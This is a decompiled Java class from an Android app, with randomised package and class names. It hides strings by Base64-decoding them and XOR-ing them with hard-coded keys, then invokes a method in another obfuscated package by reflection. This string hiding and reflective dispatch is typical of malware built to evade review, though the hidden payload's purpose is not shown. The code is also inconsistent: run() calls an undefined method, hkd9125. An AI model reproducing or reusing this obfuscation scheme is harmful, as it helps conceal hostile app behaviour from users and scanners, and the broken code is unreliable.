package seC.dujmehn.Cutyq;

import android.util.Base64;
import java.lang.reflect.InvocationTargetException;

/* JADX INFO: renamed from: seC.dujmehn.Cutyq.s */
/* JADX INFO: loaded from: classes.dex */
final class RunnableC0250s implements Runnable {
    RunnableC0250s() {
    }

    public static String run9125() {
        byte[] wjxzqy = Base64.decode("cVEJUUdUYBEKWxlBR1N0UFRURQQRQBBZQ0NfWl8QVFBfVRZVFVdMRQVYS1dRFlZXTVRFRUJfAVNDWlhTAhAOAQIAVA==".getBytes(), 0);
        String x = new String(wjxzqy);
        StringBuilder xg = new StringBuilder();
        for (int n = 0; n < x.length(); n++) {
            xg.append((char) (x.charAt(n) ^ "20d4555ec7944671917e13d633648071".charAt(n % "20d4555ec7944671917e13d633648071".length())));
        }
        String w = xg.toString();
        return w;
    }

    public static void ujqxuoPGuoOphWNH(String str) throws IllegalAccessException, InvocationTargetException {
        seC.dujmehn.qdtheyt.s.q.q.class.getMethod(ujqxuoPGuoOphWNH6392(), String.class).invoke(null, str);
    }

    public static String ujqxuoPGuoOphWNH6392() {
        byte[] wjxzqy = Base64.decode("BQ==".getBytes(), 0);
        String x = new String(wjxzqy);
        StringBuilder xg = new StringBuilder();
        for (int n = 0; n < x.length(); n++) {
            xg.append((char) (x.charAt(n) ^ "dde8871914a84f74ba5e7a8b74b4669d".charAt(n % "dde8871914a84f74ba5e7a8b74b4669d".length())));
        }
        String w = xg.toString();
        return w;
    }

    @Override // java.lang.Runnable
    public final void run() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        ujqxuoPGuoOphWNH(hkd9125());
        C0248q.m44q();
    }
}
